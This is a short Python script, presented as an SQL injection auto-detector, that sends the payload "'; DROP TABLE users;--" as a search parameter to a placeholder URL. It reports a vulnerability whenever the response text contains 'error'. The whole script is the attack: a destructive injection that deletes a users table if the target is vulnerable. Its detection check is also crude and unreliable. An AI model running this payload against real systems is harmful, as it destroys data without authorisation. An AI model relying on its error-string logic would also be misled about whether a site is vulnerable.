print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY TO AUTO DETECT SQLI INJECTION')
import requests

url = 'https://example.com/search'
search_query = "'; DROP TABLE users;--"

# Send a GET request with the injected search query
response = requests.get(url, params={'q': search_query})

# Check if the SQL injection was successful
if 'error' in response.text.lower() or 'syntax error' in response.text.lower():
    print('SQL injection vulnerability found')
else:
    print('No SQL injection vulnerability found, SORRY')
